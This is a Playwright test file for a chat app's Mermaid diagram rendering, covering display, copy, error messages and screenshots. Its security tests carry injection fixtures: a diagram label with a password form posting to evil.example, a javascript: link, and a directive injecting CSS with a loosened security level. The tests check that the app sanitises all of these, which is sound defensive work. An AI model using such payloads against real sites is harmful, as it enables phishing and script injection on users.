import { test, expect, type APIRequestContext, type Page } from "./fixtures";
import { createChat, deleteAllChats, openChat } from "./helpers";

const GOOD = "flowchart TD\n  A[Start] --> B[Done]";
const BAD = "flowchart TD\n  A[Start] -->";
const TS = "const answer: number = 42;";
const REPLY = ["Here you go.", "```mermaid\n" + GOOD + "\n```", "```mermaid\n" + BAD + "\n```", "```ts\n" + TS + "\n```"].join("\n\n");

// A label with a password form that posts elsewhere, a javascript: link, and an init directive that injects CSS.
const EVIL_LABEL = `flowchart TD\n  A["<form action='https://evil.example/x'><input type='password' name='p'>Sign in</form>"] --> B[Next]\n  click B href "javascript:alert(1)"`;
const EVIL_CSS = `%%{init: {"themeCSS": "@keyframes pwnedkeyframes { from { opacity: 0 } }", "securityLevel": "loose"}}%%\nflowchart TD\n  A --> B`;

test.beforeEach(async ({ request, context }) => {
  await context.grantPermissions(["clipboard-read", "clipboard-write"]);
  await deleteAllChats(request);
});

async function seeded(page: Page, request: APIRequestContext, theme = "dark", reply = REPLY) {
  await page.addInitScript((t) => localStorage.setItem("vas:theme", t), theme);
  const id = await createChat(request, { title: "Diagrams" });
  const res = await request.post(`/api/conversations/${id}/messages`, { data: { role: "assistant", content: reply } });
  expect(res.ok()).toBeTruthy();
  await openChat(page, id);
  return id;
}

test("a mermaid fence draws an SVG; the toggle and Copy work", async ({ page, request }) => {
  await seeded(page, request);
  const diagram = page.getByRole("img", { name: "Flowchart diagram" });
  await expect(diagram.locator("svg")).toBeVisible();

  await page.getByRole("button", { name: "Show code" }).click();
  const hide = page.getByRole("button", { name: "Show diagram" });
  await expect(page.locator("pre", { hasText: "A[Start] --> B[Done]" }).last()).toBeVisible();
  await expect(diagram).toHaveCount(0);
  await hide.click();
  await expect(diagram.locator("svg")).toBeVisible();

  await page.getByRole("button", { name: "Copy diagram source" }).click();
  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(GOOD);
});

test("a broken diagram shows its code and one plain error line; the ts block is untouched", async ({ page, request }) => {
  await seeded(page, request);
  await expect(page.getByText(/^Couldn.t draw this diagram\. Parse error on line \d+: Expecting/)).toHaveCount(1);
  await expect(page.locator("pre", { hasText: /A\[Start\] -->$/ }).last()).toBeVisible();
  await expect(page.getByRole("img", { name: "Flowchart diagram" })).toHaveCount(1);
  await expect(page.getByText("const answer: number = 42;")).toBeVisible();
  await expect(page.getByText("ts", { exact: true })).toBeVisible();
  await expect(page.getByRole("button", { name: "Show code" })).toHaveCount(1); // only the good diagram has the toolbar
});

test("a diagram cannot bring in forms, javascript: links or app-wide CSS", async ({ page, request }) => {
  await seeded(page, request, "dark", "```mermaid\n" + EVIL_LABEL + "\n```\n\n```mermaid\n" + EVIL_CSS + "\n```");
  await expect(page.getByRole("img", { name: "Flowchart diagram" })).toHaveCount(2);
  const svgs = page.getByRole("img", { name: "Flowchart diagram" });
  await expect(svgs.locator("svg")).toHaveCount(2);
  await expect(svgs.locator("form, input, button, textarea, select, a")).toHaveCount(0);
  const html = await svgs.evaluateAll((els) => els.map((e) => e.innerHTML).join("\n"));
  expect(html).not.toContain("javascript:");
  expect(html).not.toContain("evil.example");
  expect(html).not.toContain("pwnedkeyframes");
  await expect(page.locator("form[action*='evil.example']")).toHaveCount(0);
});

test("the artifact viewer draws a mermaid artifact without forms or javascript: links", async ({ page, request }) => {
  const id = await seeded(page, request, "dark", "Plain reply, with no diagram in it.");
  const res = await request.post(`/api/conversations/${id}/artifacts`, { data: { type: "mermaid", title: "Evil flow", content: EVIL_LABEL } });
  expect(res.status()).toBe(201);
  await page.reload();
  await page.getByRole("button", { name: /artifacts/i }).first().click();
  await page.getByText("Evil flow", { exact: true }).click();
  const svg = page.locator("svg[id^='mermaid-']");
  await expect(svg.first()).toBeVisible();
  const html = await page.locator("[role='dialog'], aside, main").evaluateAll((els) => els.map((e) => e.innerHTML).join("\n"));
  expect(html).not.toContain("javascript:");
  expect(html).not.toContain("evil.example");
  await expect(svg.first().locator("form, input, a")).toHaveCount(0);
});

for (const theme of ["dark", "light"]) {
  test(`${theme}, 1280px`, async ({ page, request }) => {
    await seeded(page, request, theme);
    await expect(page.getByRole("img", { name: "Flowchart diagram" }).locator("svg")).toBeVisible();
    await expect(page.getByText(/^Couldn.t draw this diagram\./)).toBeVisible();
    await page.evaluate(() => document.fonts.ready);
    await page.mouse.move(2, 2);
    await expect(page).toHaveScreenshot(`chat-mermaid-${theme}.png`, {
      mask: [page.getByText(/^(just now|\d+[mhd] ago|\d+mo ago)$/), page.locator("button:has(svg[width='36'])")],
    });
  });
}
